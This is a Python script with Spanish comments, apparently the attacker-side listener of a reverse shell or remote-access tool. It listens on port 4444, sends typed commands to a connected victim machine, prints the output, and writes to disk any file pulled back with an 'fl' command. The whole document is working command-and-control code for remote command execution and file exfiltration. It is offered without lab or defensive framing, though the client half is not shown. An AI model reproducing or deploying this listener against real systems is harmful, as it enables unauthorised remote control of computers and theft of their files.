import socket  # Importa el módulo para la comunicación mediante sockets

# Definición de variables constantes
PUERTO , HOST = 4444, "0.0.0.0"  # Puerto y dirección IP del servidor
TAM_MAX = 1024  # Tamaño máximo de datos a recibir

# Crea un objeto de socket y lo vincula al puerto y dirección especificados
s = socket.socket()
s.bind((HOST, PUERTO))

# Pone el socket en modo de escucha para aceptar conexiones entrantes
s.listen()

# Acepta la conexión entrante y obtiene la información del cliente
s_use , info_cliente = s.accept()
print(f"Conectado a la dirección {info_cliente}")

# Función para recibir datos del socket con una longitud específica
def socket_recv(sock, longitud_datos):
    contador_datos = 0  # Inicializa un contador para el total de datos recibidos
    datos_totales = None  # Inicializa una variable para almacenar todos los datos recibidos
    while contador_datos < longitud_datos:  # Itera mientras no se hayan recibido todos los datos esperados
        longitud_a_recibir = longitud_datos - contador_datos  # Calcula la longitud de datos que falta por recibir
        if longitud_a_recibir > TAM_MAX:  # Si la longitud a recibir es mayor que el tamaño máximo de datos a recibir
            longitud_a_recibir = TAM_MAX  # Establece la longitud a recibir como el tamaño máximo de datos a recibir
        datos = sock.recv(longitud_a_recibir)  # Recibe datos del socket con la longitud especificada
        if not datos:  # Si no hay datos recibidos
            return None  # Retorna None, indicando que no se recibieron datos correctamente
        if not datos_totales:  # Si no se han recibido datos previamente
            datos_totales = datos  # Asigna los datos recibidos a la variable de datos totales
        else:
            datos_totales += datos  # Concatena los datos recibidos a los datos totales previamente recibidos
        contador_datos += len(datos)  # Incrementa el contador de datos con la longitud de los datos recibidos en esta iteración
    return datos_totales  # Retorna todos los datos recibidos

# Función para enviar comandos al socket y recibir datos en respuesta
def enviar_cmd_recibir_datos(sk, cmd):
    if cmd == "":  # Si el comando está vacío
        return None  # Retorna None, indicando que no se envió ningún comando
    sk.sendall(cmd.encode())  # Envia el comando codificado al socket del cliente

    # Recibe la longitud de los datos a recibir del socket del cliente y decodifica el mensaje
    longitud_datos = socket_recv(sk, 13)
    longitud = int(longitud_datos.decode())  # Convierte la longitud de los datos a un entero
    # Recibe los datos del socket del cliente con la longitud especificada
    datos_recibidos = socket_recv(sk, longitud)
    return datos_recibidos  # Retorna los datos recibidos en respuesta al comando enviado


# Bucle principal para recibir comandos del usuario y enviar/recibir datos al cliente
while True:
    cmd = input('s4phulkx@$ ')  # Espera un comando del usuario
    datos_recibidos = enviar_cmd_recibir_datos(s_use, cmd)  # Envía el comando al cliente y recibe datos en respuesta
    if not datos_recibidos:
        print('No se recibieron datos ')
        break
    if cmd == 'fin':  # Si el comando es 'fin', termina el bucle
        break
    if cmd[:2] == 'fl':  # Si el comando empieza con 'fl' (lectura de archivo)
        archivo = cmd[3:]
        f = open(archivo, 'wb')  # Abre el archivo en modo de escritura binaria
        f.write(datos_recibidos)  # Escribe los datos recibidos en el archivo
        f.close()  # Cierra el archivo después de escribir
    else:
        print(datos_recibidos.decode())  # Imprime los datos recibidos

# Cierra la conexión
s.close()
s_use.close()
